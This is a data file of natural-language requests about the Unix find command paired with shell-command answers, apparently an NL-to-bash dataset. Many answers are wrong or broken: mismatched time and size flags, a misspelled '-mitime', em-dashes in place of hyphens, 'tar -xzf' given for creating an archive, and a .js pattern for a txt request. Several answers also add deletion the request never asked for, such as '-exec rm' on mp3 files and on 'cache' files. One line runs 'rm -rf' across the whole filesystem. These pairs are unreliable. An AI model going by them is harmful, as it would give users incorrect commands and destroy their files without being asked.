{"input": "find all the files in the current directory which end with orig", "answer": "find . -name '*.orig'  -exec echo {} \\ ;"}
{"input": "find all the files in the current directory which have been modified after a file", "answer": "find . -newer file"}
{"input": "find all the files in the current directory which have been modified in the  last 6 days", "answer": "find . -atime +6"}
{"input": "find all the files in the current directory which have been modified in the last 24 hours", "answer": "find . -mtime 0"}
{"input": "find all the files in the current directory which have been modified in the last 30 days and display the contents", "answer": "find . -atime +30 -exec ls \\;"}
{"input": "find all the files in the current directory which have the inode number 31246 and remove them", "answer": "find . -inum 31246 -exec rm [] ';'"}
{"input": "find all the files in the current directory which have the size 40 bytes in the current disk partition", "answer": "find . -size -40 -xdev -print"}
{"input": "find all the files in the current directory which start with t and have been modified between one hour (60 minutes) and 12 hours (720 minutes) ago", "answer": "find . -mmin -720 -mmin +60 -type f -name \"t*\" -exec ls -l '{}' \\;"}
{"input": "find all the files in the current directory whose size is equal to exactly 126MB", "answer": "find . -size 126M"}
{"input": "find all the files in the current directory with the name \"wagoneer\" which are in the current device", "answer": "find . -xdev -name \"wagoneer*\" -print"}
{"input": "find all the files in the current folder (handles files which contain newlines or only spaces in their names)", "answer": "find . -print0 | xargs -0 -l -i echo \"{}\";"}
{"input": "find all the files in the current folder and display adding quotations to each file", "answer": "find . -exec echo -n '\"{}\" ' \\;"}
{"input": "find all the files in the current folder and display adding quotations to each file and replace spaces with new line", "answer": "find $PWD -exec echo -n '\"{}\" ' \\; | tr '\\n' ' '"}
{"input": "find all the files in the current folder and display them in the sorted order of their name", "answer": "find . | sort"}
{"input": "find all the files in the current folder and display those that are not present in the list \"file.lst\"", "answer": "find . | grep -vf file.lst"}
{"input": "find all the files in the current folder and search for the word \"vps admin\" in them", "answer": "find . -exec grep -i \"vds admin\" {} \\;"}
{"input": "find all the files in the current folder that are modified after the modification date of a file", "answer": "find . -newer document -print"}
{"input": "find all the files in the current folder that have a single letter in their name which have been modified in the last 3 days but not today", "answer": "find . -name \\? -daystart -mtime +0 -mtime -3"}
{"input": "find all the files in the current folder that have been accessed in today", "answer": "find -atime 0"}
{"input": "find all the files in the current folder that have been accessed in today from the start of the day", "answer": "find -daystart   -atime 0"}
{"input": "find all the files in the current folder that have been modified exactly 24*3 hours ago", "answer": "find ./ -mtime 3"}
{"input": "find all the files in the current folder that have been modified in the last 7 days", "answer": "find -mtime -7 -daystart"}
{"input": "find all the files in the current folder that have not been modified in the last 24*3 hours", "answer": "find ./ -mtime +3"}
{"input": "find all the files in the current folder which are bigger than 1MB", "answer": "find . \u2014 size +1000k -print"}
{"input": "find all the files in the current folder which are bigger than 9MB", "answer": "find . -size +9M"}
{"input": "find all the files in the current folder which are smaller than 9MB", "answer": "find . -size -9k"}
{"input": "find all the files in the current folder which belong to the user root", "answer": "find . -user root -perm -4000 -print"}
{"input": "find all the files in the current folder which do not belong to any user", "answer": "find . -nouser -ls"}
{"input": "find all the files in the current folder which do not have the execute permission", "answer": "find . -type d ! -perm -111"}
{"input": "find all the files in the current folder which do not have the read permission", "answer": "find . -type f ! -perm -444"}
{"input": "find all the files in the current folder which end with \"ext1\" or \"ext2\" or \"ext3\"", "answer": "find -E . -regex \".*ext1|.*ext2|.*ext3\""}
{"input": "find all the files in the current folder which end with .o or with the name a.out and display them", "answer": "find . ( -name a.out -o -name *.o ) -print"}
{"input": "find all the files in the current folder which have a set uid set", "answer": "find . -perm -4000 -print"}
{"input": "find all the files in the current folder which have been accessed in the last 24 hours", "answer": "find . -type f -atime 1"}
{"input": "find all the files in the current folder which have been modified after the file disk.log", "answer": "find . -newer disk.log -print"}
{"input": "find all the files in the current folder which have been modified for the ffiles that are at least one week old (7 days) but less then 30 days old", "answer": "find . -mtime +30 -a -mtime -7 -print0"}
{"input": "find all the files in the current folder which have been modified in the 10 minutes ago", "answer": "find -mmin +15 -mmin -25"}
{"input": "find all the files in the current folder which have been modified in the last 60 minutes, which are atleast 1 level deep and display a long listing of these files", "answer": "find . -mindepth 1 -mmin -60 | xargs -r ls -ld"}
{"input": "find all the files in the current folder which have been modified in the last one day", "answer": "find . -daystart -mtime -1 -ls"}
{"input": "find all the files in the current folder which have been modified in the last one minute", "answer": "find . -type f -mmin 0"}
{"input": "find all the files in the current folder which have executable permission to all the users and display the ten files", "answer": "find . -perm /a=x | head"}
{"input": "find all the files in the current folder which have execute permission", "answer": "find . -executable"}
{"input": "find all the files in the current folder which have execute permission to all the users", "answer": "find . -perm /u=x,g=x,o=x"}
{"input": "find all the files in the current folder which have set guid bit on and list the top 10 files", "answer": "find . -perm /g+s | head"}
{"input": "find all the files in the current folder which have the name net or comm in them", "answer": "find . -regex '.*\\(net\\|comm\\).*'"}
{"input": "find all the files in the current folder which have the word cache in them and do not search in the sub directories of the folder", "answer": "find . -name 'cache*' -depth -exec rm {} \\;"}
{"input": "find all the files in the current folder which which have been modified yesterday and day before yesterday and whose name is of length 1", "answer": "find . -name \\? -daystart -mtime +0 -mtime -3"}
{"input": "find all the files in the current folder whose name starts with 2 alphabets and ends with 2 digits", "answer": "find . \u2014 name \"[a\u2011z][a\u2011z][0\u20149][0\u20149].txt\" \u2014 print"}
{"input": "find all the files in the current folder with the name \"test-a\" and move them to the folder test-10", "answer": "find ~ -type f -name test-a -exec mv {} test-10 \\;"}
{"input": "find all the files in the current folder with the name \"test-a\" and move them to the folder test-10. execdir runs the command in the directory where the file is found", "answer": "find ~ -type f -name test-a -execdir mv {} test-10 \\;"}
{"input": "find all the files in the directory which is pointed by $1 variable ending with the name held in the variable $2 or having the extension of value saved in the argument $2", "answer": "find $1 \\( -name \"*$2\" -o -name \".*$2\" \\) -print"}
{"input": "find all the files in the entire file system excluding the folder proc, which do not belong to any user or any group", "answer": "find / -path /proc -prune -o -nouser -o -nogroup"}
{"input": "find all the files in the entire file system starting with the word top", "answer": "find / -name 'top?????*'"}
{"input": "find all the files in the entire file system that have been accessed exactly  50 days ago", "answer": "find / -atime 50"}
{"input": "find all the files in the entire file system that have been changed exactly  60 days  and display ten files", "answer": "find / -cmin -60 | head"}
{"input": "find all the files in the entire file system that have been modified between 50 to 100 days and display ten files", "answer": "find / -mtime +50 -mtime -100 | head"}
{"input": "find all the files in the entire file system that have been modified exactly 7 days before which end with \"conf\"", "answer": "find / -name \"*conf\" -mtime 7"}
{"input": "find all the files in the entire file system that start with the word top and have 3 letters next to it", "answer": "find / -name 'top???'"}
{"input": "find all the files in the entire file system that start with top", "answer": "find / -name 'top*'"}
{"input": "find all the files in the entire file system that were modified in the last 10 minutes", "answer": "find / -mmin -10"}
{"input": "find all the files in the entire file system which belong to the group \"staff\"", "answer": "find / -group staff -print"}
{"input": "find all the files in the entire file system which have been modified in the last 120 hours", "answer": "find / -mtime -5 -print"}
{"input": "find all the files in the entire file system which have been modified in the last 48 hours", "answer": "find / -mtime -2 -print"}
{"input": "find all the files in the entire file system which have been modified in the last 5 days", "answer": "find / -mtime -5 -print"}
{"input": "find all the files in the entire file system whose size is between 50Mb to 100MB", "answer": "find / -size +50M -size -100M"}
{"input": "find all the files in the entire file system whose size is exactly 15MB", "answer": "find / -size 15M"}
{"input": "find all the files in the entire file system whose size is greater than 20MB", "answer": "find / -type f -size +20000k"}
{"input": "find all the files in the entire filesystem which belong to the group root and display the ten files", "answer": "find / -group root | head"}
{"input": "find all the files in the entire filesystem which belong to the user root and display the ten files", "answer": "find / -user root | head"}
{"input": "find all the files in the file system that belong to the user www", "answer": "find / -user www -print"}
{"input": "find all the files in the file system that start with \"win\" and searched only in the mounted file systems", "answer": "find / -mount -name 'win*'"}
{"input": "find all the files in the file system whcih have been modified in the last 1 day", "answer": "find / -mtime -1"}
{"input": "find all the files in the file system which are bigger than 3 bytes", "answer": "find / -size +3 -print"}
{"input": "find all the files in the file system which belong to the groep \"users\" and with the name \"dateiname\"", "answer": "find / -group users -iname \"Dateiname\""}
{"input": "find all the files in the file system which belong to the user \"pat\" and with the name \"dateiname\"", "answer": "find / -user pat -iname \"Dateiname\""}
{"input": "find all the files in the file system which hae set uid enabled and save them to /root/suid.txt and those which have size greater than 100MB save them to /root/big.txt", "answer": "find /    \\( -perm -4000 -fprintf /root/suid.txt '%#m %u %p\\n' \\) , ( -size +100M -fprintf /root/big.txt '%-10s %p\\n' \\)"}
{"input": "find all the files in the file system which have been accessed in the last 1 day", "answer": "find / -atime -1"}
{"input": "find all the files in the file system which have been changed 1 minute ago", "answer": "find / -newerct '1\tminute ago' -print"}
{"input": "find all the files in the file system which have been changed in the last 24 hours", "answer": "find / -ctime -1"}
{"input": "find all the files in the file system which have been modified in the last 30*24 hours", "answer": "find / -mtime -30 -print"}
{"input": "find all the files in the file system which have been modified in the last 60 minutes", "answer": "find / -mmin -60"}
{"input": "find all the files in the file system which have not been modified in the last 100*24 hours", "answer": "find / -mtime +100 -print"}
{"input": "find all the files in the file system which have read permission to the user and display the ten files", "answer": "find / -perm /u=r | head"}
{"input": "find all the files in the file system which have sticky bit enabled to the user", "answer": "find / -perm -u+s"}
{"input": "find all the files in the file system which have the permission 777 and with the name \"dateiname\"", "answer": "find / -perm 777 -iname \"Dateiname\""}
{"input": "find all the files in the filesystem which do not belong to any group", "answer": "find / -nogroup -print"}
{"input": "find all the files in the folder \"/mp3-collection\" which are bigger than 10MB excluding those that start with the word Metallica", "answer": "find /mp3-collection -size +10000k ! -name \"Metallica*\""}
{"input": "find all the files in the folder \"/u/bill\" which have been accessed in the last 2-6 minutes", "answer": "find /u/bill -amin +2 -amin -6"}
{"input": "find all the files in the folder \"/usr/app/etl/01/OTH/log/tra\" which have been modified  in the last 240 hours  excluding hidden files and those with the name \"/usr/app/etl/01/CLE/par/files_to_skip.par\"", "answer": "find /usr/app/etl/01/OTH/log/tra -type f ! -name \".*\" -mtime -10 | egrep -vf /usr/app/etl/01/CLE/par/files_to_skip.par"}
{"input": "find all the files in the folder \"myfiles\" which have been modified exactly 48 hours back", "answer": "find /myfiles -mtime 2"}
{"input": "find all the files in the folder ./machbook and change the owner of them to the user with id \"184\"", "answer": "find ./machbook -exec chown 184 {} \\;"}
{"input": "find all the files in the folder .home/calvin which have been modified in th last 45 minutes", "answer": "find /home/calvin/ -mmin -45"}
{"input": "find all the files in the folder /home which are bigger than 10MB and smaller than 50 MB", "answer": "find /home -size +10M -size -50M"}
{"input": "find all the files in the folder /opt which have been modified between 20 to 50 days ago", "answer": "find /opt -mtime +30 -mtime -50"}
{"input": "find all the files in the folder /path/to/dir which have been modified after a specific date (Feb 07)", "answer": "find /path/to/dir -newermt 'Feb 07'"}
{"input": "find all the files in the folder /work which belong to the user \"olivier\"", "answer": "find /work -user olivier -print"}
{"input": "find all the files in the folder Musica and display them in a single line null separated", "answer": "find M\u00fasica/* | egrep -Z \\/\\\\. | xargs -0 echo"}
{"input": "find all the files in the folder ~/Music which begin with \"Automatically Add\"", "answer": "find ~/Music/ -name \"Automatically Add*\""}
{"input": "find all the files in the home folder that are modified day before yesterday", "answer": "find $HOME -mtime -2 -mtime +1"}
{"input": "find all the files in the home folder that have been modified between 24 to 48 hours", "answer": "find $HOME -mtime -2 -mtime +1"}
{"input": "find all the files in the home folder that have not been modified in the last one year", "answer": "find $HOME -mtime +365"}
{"input": "find all the files in the home folder which are bigger than 2MB and zip them", "answer": "find ~ -size +2000000c -regex '.*[^gz]' -exec gzip '{}' ';'"}
{"input": "find all the files in the home folder which are less than 300Bytes", "answer": "find ~ -size -300b"}
{"input": "find all the files in the home folder which are less than 42 Bytes", "answer": "find / -size 42"}
{"input": "find all the files in the home folder which end with \".tex\"", "answer": "find ~ -iname '*.tex'"}
{"input": "find all the files in the home folder which have been modified after a file", "answer": "find $HOME -newer ~joeuser/lastbatch.txt"}
{"input": "find all the files in the home folder which have been modified in 1 year or more ( which are not modified in the last 1 year )", "answer": "find $HOME -mtime +365"}
{"input": "find all the files in the home folder which have been modified in the last 24 hours", "answer": "find $HOME -mtime -1"}
{"input": "find all the files in the home folder which have been modified in the last 30 minutes", "answer": "find $HOME -mmin -30"}
{"input": "find all the files in the home folder which have been modified in the last 7 days", "answer": "find $HOME -mtime -7"}
{"input": "find all the files in the home folder which have been modified today", "answer": "find ~ -type f -mtime 0"}
{"input": "find all the files in the home folder which have not been modified in the last 1 year", "answer": "find $HOME -mtime +365"}
{"input": "find all the files in the present directory which have the group staff and check if is a symbolic link and display it", "answer": "find `pwd` -group staff -exec find {} -type l -print ;"}
{"input": "find all the files in the root folder which have been modified in the last 24 hours and print them", "answer": "find / -mtime -1 -print"}
{"input": "find all the files starting with \"config\" in the folder Symfony", "answer": "find Symfony -name '*config*';"}
{"input": "find all the files starting with \"config\" in the folder Symfony ( case insensitive search)", "answer": "find Symfony -iname '*config*';"}
{"input": "find all the files that are modified exactly one day ago", "answer": "find -daystart -mtime 1"}
{"input": "find all the files that are modified in the last 1 day", "answer": "find  -mtime -1"}
{"input": "find all the files that are modified in the last 7 days", "answer": "find -daystart -mtime -7"}
{"input": "find all the files that are not modified in the last 7 days", "answer": "find -daystart -mtime +7"}
{"input": "find all the files that have been changed exactly 24 hours ago", "answer": "find . -ctime 1 -type f"}
{"input": "find all the files that have been changed today", "answer": "find . -ctime 0 -type f"}
{"input": "find all the files that have been modified exactly 1 day ago", "answer": "find -mtime 1"}
{"input": "find all the files that have been modified exactly 2 days ago", "answer": "find -mtime 2"}
{"input": "find all the files that have been modified exactly yesterday (from 00:00 to 23:59 yesterday)", "answer": "find . -type f -daystart -mtime 1"}
{"input": "find all the files that have been modified in the last 1 day", "answer": "find . -type f -daystart -mtime -1"}
{"input": "find all the files that have been modified in the last 1 day ago", "answer": "find -mtime -1"}
{"input": "find all the files that have been modified in the last 12 hours", "answer": "find ./ -mtime -0.5"}
{"input": "find all the files that have been modified in the last 2 day", "answer": "find -daystart -mitime -1"}
{"input": "find all the files that have been modified in the last 2 days", "answer": "find . -type f -daystart -mtime -2"}
{"input": "find all the files that have been modified in the last 24 hours", "answer": "find . -type f -mtime -1"}
{"input": "find all the files that have been modified in the last 4 days ( daystart is used to check files according to date i.e, all files modified from currentDay-4 00:00:00 to current day) and copy them to folder", "answer": "find . -mtime 4 -daystart -exec cp -a {} /home/devnet/fileshare\\$ on\\ X.X.X.X/RECOVER/ \\;"}
{"input": "find all the files that have been modified in the last 60 minutes", "answer": "find -mmin -60"}
{"input": "find all the files that have been modified in the last 7 days,", "answer": "find . -mtime -7 -print"}
{"input": "find all the files that have been modified since the last time we checked", "answer": "find /etc -newer /var/log/backup.timestamp -print"}
{"input": "find all the files that have been modified today", "answer": "find . -type f -mtime 0"}
{"input": "find all the files that have not been modified in the last (24*7) hours", "answer": "find . -mtime +7"}
{"input": "find all the files that have not been modified in the last 2 days", "answer": "find -mtime +2"}
{"input": "find all the files that have the word \"fstab\" in their name in a folder", "answer": "find /etc -name *fstab*"}
{"input": "find all the files that were modified two days ago", "answer": "find . -daystart -ctime 1 -type f"}
{"input": "find all the files that were modified yesterday in the current directory", "answer": "find . -daystart -ctime 0 -type f"}
{"input": "find all the files under '/usr/local' directory tree which have been modified exactly 24 hours ago", "answer": "find /usr/local -mtime 1"}
{"input": "find all the files which end with \".deb\" and display their base name (strip the extension)", "answer": "find . -name '*.deb' | xargs -n1 basename"}
{"input": "find all the files which have been accessed after modifying the file /etc/hosts", "answer": "find -anewer /etc/hosts"}
{"input": "find all the files which have been changed after the modification of a file", "answer": "find -cnewer /etc/fstab"}
{"input": "find all the files which have been modified in the last 15 minutes excluding hidden files", "answer": "find . -mmin -15 \\( ! -regex \".*/\\..*\" \\)"}
{"input": "find all the files which have not been modified in the last 1 year and display the total disk usage of them  in GB", "answer": "find . -type f -mtime +356 -printf '%s\\n'  | awk '{a+=$1;} END {printf \"%.1f GB\\n\", a/2**30;}'"}
{"input": "find all the files which have the write permission to the group and remove the write permission", "answer": "find . -perm -20 -exec chmod g-w {} ;"}
{"input": "find all the files which start with the name \"Metallica\" in the folder \"/mp3-collection\" and which are bigger than 10MB", "answer": "find /mp3-collection -name 'Metallica*' -and -size +10000k"}
{"input": "find all the files with the name \"datainame\" in the file system which are bigger than 50MB", "answer": "find / -size +50M -iname \"Dateiname\""}
{"input": "find all the files with the name september ( case insensitive )", "answer": "find -iname september"}
{"input": "find all the files within your home folder accessed more than 100 days ago", "answer": "find ~ -atime 100"}
{"input": "find all the findme.txt files in the file system", "answer": "find / -name findme.txt -type f -print"}
{"input": "find all the fles that have .ssh in the end and redirect the output to ssh-stuff", "answer": "find / -name .ssh* -print | tee -a ssh-stuff"}
{"input": "find all the foo.txt files in the current folder and move them to another directory", "answer": "find . -name \"foo.txt\" | awk '{ print \"mv \"$0\" ~/bar/\" | \"sh\" }'"}
{"input": "find all the header files in /usr/include which have been modified in the last 399 days and display the number of lines, number of files, number of characters of all these files", "answer": "find usr/include -name '*.h' -mtime -399 | wc"}
{"input": "find all the hidden files in the temp folder", "answer": "find /tmp -type f -name \".*\""}
{"input": "find all the html files in the current folder and delete a line", "answer": "find ./ -type f -name '*.html' | xargs sed -i '1,/sblmtitle/d'"}
{"input": "find all the html files in the current folder and rename them to .var files", "answer": "find -name '*.html' -print0 | xargs -0 rename 's/\\.html$/.var/'"}
{"input": "find all the html files in the current folder and replace the end of each line with a pattern", "answer": "find ./ -type f -name '*.html' | xargs sed -i '$s/$/<\\/description>/'"}
{"input": "find all the html files in the current folder which have been modified exactly 7 days ago", "answer": "find . -mtime 7 -name \"*.html\" -print"}
{"input": "find all the html files in the current folder which have been modified excatly 7 days before", "answer": "find . -mtime 7 -name \"*.html\" -print"}
{"input": "find all the html files in the current folder which have been modified in the last 7 days", "answer": "find . -mtime -7 -name \"*.html\" -print"}
{"input": "find all the html files in the current folder which have not been modified in the last 7 days", "answer": "find . -mtime +7 -name \"*.html\" -print"}
{"input": "find all the html files that are acces in the last 24 hours in the current folder", "answer": "find . -mtime 1 -name \"*.html\" -print"}
{"input": "find all the html files which are modified in the last 7 days", "answer": "find . -mtime -7 -name \"*.html\""}
{"input": "find all the html, javascript and text files in the current folder", "answer": "find . -type f -name \"*.htm*\" -o -name \"*.js*\" -o -name \"*.txt\""}
{"input": "find all the javascript files in current folder using regular expressions", "answer": "find . -regex '.+\\.js'"}
{"input": "find all the jpg files in current folder and sort them", "answer": "find . -type f|grep -i \"\\.jpg$\" |sort"}
{"input": "find all the jpg files in the directory /ftp/dir which are bigger than 500KB", "answer": "find /ftp/dir/ -size +500k -iname \"*.jpg\""}
{"input": "find all the links in somedirectory and print them in a single line (to avoid the problem of files having newline in their names)", "answer": "find \"somedir\" -type l -print0"}
{"input": "find all the links in the current directory and print them in each line and display their names", "answer": "find . -type l -print | xargs ls -ld | awk '{print $10}'"}
{"input": "find all the links in the current folder and following it to the pointed path", "answer": "find -L /target -type l"}
{"input": "find all the links in the current folder which are broken", "answer": "find /target -type l -xtype l"}
{"input": "find all the log files in the file system", "answer": "find / -name \"*.log\""}
{"input": "find all the log files in the file system which are present in the current partition", "answer": "find / -xdev -name \"*.log\""}
{"input": "find all the mp3 files in the current folder and move them to another folder", "answer": "find . -name \"*.mp3\" -exec mv {} \"/Users/sir/Music//iTunes/iTunes Media/Automatically Add to iTunes.localized/\" \\;"}
{"input": "find all the mp3 files in the entire file system whose size is bigger than 10MB", "answer": "find / -type f -name *.mp3 -size +10M -exec rm {} \\;"}
{"input": "find all the mp3 files in the file system", "answer": "find / -iname \"*.mp3\" -print"}
{"input": "find all the mp3 files in the home folder which have been modified today", "answer": "find ~ -type f -mtime 0 -iname '*.mp3'"}
{"input": "find all the non compressed files in the current directory and compress them", "answer": "find . \\! -name \"*.Z\" -exec compress -f {} \\;"}
{"input": "find all the normal files in the home directory which have been accesed in the last 30 days with the size greater than or equal to 100k", "answer": "find $HOME -type f -atime +30 -size 100k"}
{"input": "find all the normal/regualar files in the current folder which have a size of 10KB and display a long listing details of them", "answer": "find . -type f -size +10000 -exec ls -al {} \\;"}
{"input": "find all the normal/regular files in current folder and search for a pattern", "answer": "find . -type f -print0 | xargs -0 grep pattern"}
{"input": "find all the normal/regular files in the current directory", "answer": "find -type f"}
{"input": "find all the normal/regular files in the current directory and search for the word mail and display the file names", "answer": "find . -type f -exec grep -il mail"}
{"input": "find all the normal/regular files in the current directory which have been modified in the last 24 hours", "answer": "find . -mtime -1 -type f -print"}
{"input": "find all the normal/regular files in the current folder which are present in the pattern file \"file_list.txt\"", "answer": "find . type f -print | fgrep -f file_list.txt"}
{"input": "find all the normal/regular files in the current folder which have been accessed in the last 24 hours and display a long listing of them", "answer": "find . -type f -atime -1 -exec ls -l {} \\;"}
{"input": "find all the normal/regular files in the current folder which have been modified in the last 24 hours and display a long listing of them", "answer": "find . -type f -mtime -1 -exec ls -l {} \\;"}
{"input": "find all the normal/regular files in the current folder which have been modified in the last day and display a long listing of them", "answer": "find . -type f -mtime -1 -daystart -exec ls -l {} \\;"}
{"input": "find all the normal/regular files in the current folder which have been modified two days ago and display a long listing of them", "answer": "find . -type f -mtime 2 -mtime -3 -daystart -exec ls -l {} \\;"}
{"input": "find all the normal/regular files in the folder \"pathfolder\" excluding all hidden files and display the count", "answer": "find pathfolder -maxdepth 1 -type f -not -path '*/\\.*' | wc -l"}
{"input": "find all the normal/regular files in the folder \"pathfolder\" which are 2 levels deep, excluding all hidden files and display the count", "answer": "find pathfolder -mindepth 2 -maxdepth 2 -type f -not -path '*/\\.*' | wc -l"}
{"input": "find all the ogg files in the current directory which have the word \"monfichier\" in their name", "answer": "find -name *monfichier*.ogg"}
{"input": "find all the patch files in current folder and copy them to separate folder patches", "answer": "find -name '*.patch' -print0 | xargs -0 -I {} cp {} patches/"}
{"input": "find all the pdf files in the current directory and display only the directory name in which the pdf file is present", "answer": "find . -type f -name '*.pdf' |sed 's#\\(.*\\)/.*#\\1#' |sort -u"}
{"input": "find all the perl files in /var/www", "answer": "find /var/www/ -type f -name \"*.pl\" -print"}
{"input": "find all the perl files in /var/www ( case insensitive search )", "answer": "find /var/www/ -type f -iname \"*.pl\" -print"}
{"input": "find all the perl files in the current folder", "answer": "find . -type f -name \"*.pl\""}
{"input": "find all the perl files in the current folder and search for a pattern", "answer": "find . -name '*.pl' | xargs grep -L '^use strict'"}
{"input": "find all the php files", "answer": "find -name '*.php'"}
{"input": "find all the php files in current folder and search for multiple patterns in these files", "answer": "find -name '*.php' -exec grep -li \"fincken\" {} + | xargs grep -l \"TODO\""}
{"input": "find all the php files in current folder and search for multiple patterns in these files and display the file names", "answer": "find -name '*.php' -exec grep -in \"fincken\" {} + | grep TODO | cut -d: -f1 | uniq"}
{"input": "find all the php files in current folder using regular expressions", "answer": "find . -regex '.+\\.php'"}
{"input": "find all the php/javascript files in current folder using regular expressions", "answer": "find . -regex '.+\\.\\(php|js\\)'"}
{"input": "find all the png files in current folder which are present in the pattern list file \"search.txt\"", "answer": "find . -name '*.png' | grep -f <(sed 's?.*?/[0-9]_[0-9]_[0-9]_&_?' search.txt)"}
{"input": "find all the png files in current folder which are present in the pattern list file \"search.txt\" and copy them to another directory", "answer": "find . -name '*.png' | grep -f <(sed s?^?/[0-9]_[0-9]_[0-9]_? search.txt) | xargs -i{} cp {} /path/to/dir"}
{"input": "find all the png files in the current folder which are present in the pattern list search .txt", "answer": "find . -name '*.png' | grep -f search.txt"}
{"input": "find all the regular files in current folder, that have been changed in the last 3 days and display last 5 files", "answer": "find . -type f -ctime -3 | tail -n 5"}
{"input": "find all the regular files in the current directory which do not have a read permission", "answer": "find -type f ! -perm -444"}
{"input": "find all the regular files in the current folder which start with a \"some text\"", "answer": "find . -type f -name '*some text*'"}
{"input": "find all the regular/normal files in all the directories in the /some/dir and delete them", "answer": "find /some/dir -type d -exec find {} -type f -delete \\;"}
{"input": "find all the regular/normal files in the current direcoty which have not been accessed in the last 30 days", "answer": "find . -type f -atime +30 -print"}
{"input": "find all the regular/normal files in the current directory and print them skip searching all the directories in the current folders", "answer": "find * -type f -print -o -type d -prune"}
{"input": "find all the regular/normal files in the current directory which do not have the extension comment and and redirect the output to /tmp/list", "answer": "find . -type f \\! -name \"*.Z\" \\! -name \".comment\" -print | tee -a /tmp/list"}
{"input": "find all the regular/normal files in the current folder", "answer": "find -type f"}
{"input": "find all the regular/normal files in the current folder and rename them to html files", "answer": "find main-directory -type f -exec mv -v '{}' '{}'.html \\;"}
{"input": "find all the regular/normal files in the current folder and replace everything expect the extension of the file and display unique file extensions", "answer": "find . -type f | sed -e 's#.*\\(\\.[a-zA-Z]*\\)$#\\1#' | sort | uniq"}
{"input": "find all the regular/normal files in the current folder which belong to the users with the user id's between 500 and 1000", "answer": "find . -uid +500 -uid -1000 -type f"}
{"input": "find all the regular/normal files in the folder /travelphotos which are bigger than 200KB and which do not have the word \"2015\" in their name", "answer": "find /travelphotos -type f -size +200k -not -iname \"*2015*\""}
{"input": "find all the symbolic links in the current folder", "answer": "find /etc -type l -print"}
{"input": "find all the symbolic links in the current folder and check the file type and display the output of those files which are broken", "answer": "find ./ -type l -exec file {} \\; |grep broken"}
{"input": "find all the symbolic links in the current folder and follow to the original file", "answer": "find -L . -type l"}
{"input": "find all the symbolic links in the current folder and follow to the pointing file", "answer": "find -L"}
{"input": "find all the text files in  the current folder and do not search in somedir, bin directories", "answer": "find . -name somedir -prune , -name bin -prune -o -name \"*.txt\" -print"}
{"input": "find all the text files in current folder and force delete them", "answer": "find . -name \"*.txt\" | xargs rm -rf"}
{"input": "find all the text files in current folder and move all these to another folder appending \".bar\" at the end of these files", "answer": "find . -name \"*.txt\" | xargs -I '{}' mv '{}' /foo/'{}'.bar"}
{"input": "find all the text files in the current directory which have been modified in the last 4 days and not today and copy them to another folder", "answer": "find . -name \"*.txt\" -type f -daystart -mtime -4 -mtime +0|xargs -i cp {} /home/ozuma/tmp"}
{"input": "find all the text files in the current folder", "answer": "find . -name \"*.txt\" -print"}
{"input": "find all the text files in the current folder and display the results pagewise", "answer": "find . -name \"*.txt\" -print | less"}
{"input": "find all the text files in the current folder and display their Permissions and size along with their name", "answer": "find . -name \"*.txt\" -printf \"%M %f \\t %s bytes \\t%y\\n\""}
{"input": "find all the text files in the current folder and do not  search in the sub directories", "answer": "find -maxdepth 1 -iname \"*.txt\""}
{"input": "find all the text files in the current folder expect those which are in the path \"sk\"", "answer": "find . -path \"./sk\" -prune -o -name \"*.txt\" -print"}
{"input": "find all the text files in the current folder starting with \"somefiles-\"", "answer": "find . -name \"somefiles-*-.txt\" -type f"}
{"input": "find all the text files in the current folder starting with \"somefiles-\"  and prepend the first line", "answer": "find . -name \"somefiles-*-.txt\" -type f -exec sed -i 'iText that gets prepended (dont remove the i)' -- '{}' \\;"}
{"input": "find all the text files in the entire filesystem which belong to the user root and display the ten files", "answer": "find / -user root -iname \"*.txt\" | head"}
{"input": "find all the text files in the file system and search only in the disk partition of the root", "answer": "find / -mount -name \"*.txt\""}
{"input": "find all the text files in the folder /home/calvin and do not search beyond 2 levels", "answer": "find /home/calvin/ -maxdepth 2  -name '*.txt'"}
{"input": "find all the text files in the folder /home/calvin which are atleast below 2 levels", "answer": "find /home/calvin/ -mindepth 2  -name '*.txt'"}
{"input": "find all the text files in the home directory", "answer": "find ~/ -name '*.txt'"}
{"input": "find all the text files in the home folder", "answer": "find ~ -name \"*.txt\" \u2014 print"}
{"input": "find all the text files in the temp folder and search for the word hello in all these files and display the matched files", "answer": "find /tmp -type f -name '*.txt*' | sed -e 's/.*/\\'&\\'/' |xargs -n 1 grep -l hello|sed -e 's/.*/\\'&\\'/'"}
{"input": "find all the text files present in the current directory excluding the search in certain paths", "answer": "find . -type f -name \"*.txt\" ! -path \"./Movies/*\" ! -path \"./Downloads/*\" ! -path \"./Music/*\""}
{"input": "find all the text files that have modified in the last 2 days and not modified today", "answer": "find . -name \"*.txt\" -type f -daystart -mtime +0 -mtime -2"}
{"input": "find all the text files which are present in the current directory excludinghidden files", "answer": "find . -type f \\( -iname \"*.txt\" ! -iname \".*\" \\)"}
{"input": "find all the undo files in the current folder and display the toal lines, words, characters", "answer": "find ./ -name *.undo | xargs wc"}
{"input": "find all the video files in the home folder", "answer": "find ~ -type f -exec file -i {} + | grep video"}
{"input": "find all the video files which are bigger than 10 MB which have not been modified in the last 60 days but have been changed in the last 100 days in /tmp and /var/tmp folder home folders", "answer": "find /tmp /var/tmp ~ -type f -size +10M -mtime +60 -ctime -100 -exec file -N -i -- {} + | sed -n 's!: video/[^:]*$!!p'"}
{"input": "find all the wav files in the current folder and do not search in the sub directories", "answer": "find . -name '*.wav' -maxdepth 1"}
{"input": "find all the word press configuration php files in the folder /var/www", "answer": "find /var/www/ -name wp-config.php"}
{"input": "find all the word press configuration php files in the folder /var/www and do not search beyond two levels", "answer": "find /var/www/ -name wp-config.php -maxdepth 2"}
{"input": "find all the xml files in current folder and which are present in the pattern list file \"/tmp/a\"", "answer": "find . -name \"*.xml\" -exec grep -HFf /tmp/a {} \\;"}
{"input": "find all the xml files in the current folder except those that are present in the workspace folder and create a tarball of these files", "answer": "find . -name \\*.xml | grep -v /workspace/ | tr '\\n' '\\0' | xargs -0 tar -cf xml.tar"}
{"input": "find all the xml files in the current folder which are present in the pattern text file", "answer": "find . -name \"*.xml\" -exec grep -HFf <(find . -name \"*.txt\" -printf \"%f\\n\") {} \\;"}
{"input": "find all the zip files in the current folder", "answer": "find . -type f -name '*.zip'"}
{"input": "find all the zip files in the current folder and create a tar ball of these zip files", "answer": "find . -type f -name '*.zip' -print0 | xargs -0 tar -xzf"}
{"input": "find all txt files under the current folder except ./directory folder", "answer": "find -name \"*.js\" -not -path \"./directory/*\""}
{"input": "find all txt files under the current folder except ./misc folder", "answer": "find . -path ./misc -prune -o -name '*.txt' -print"}
{"input": "find and delete all the files in the entire file system whose size is greater than 100MB", "answer": "find / -size +100M -exec rm -rf {} \\;"}
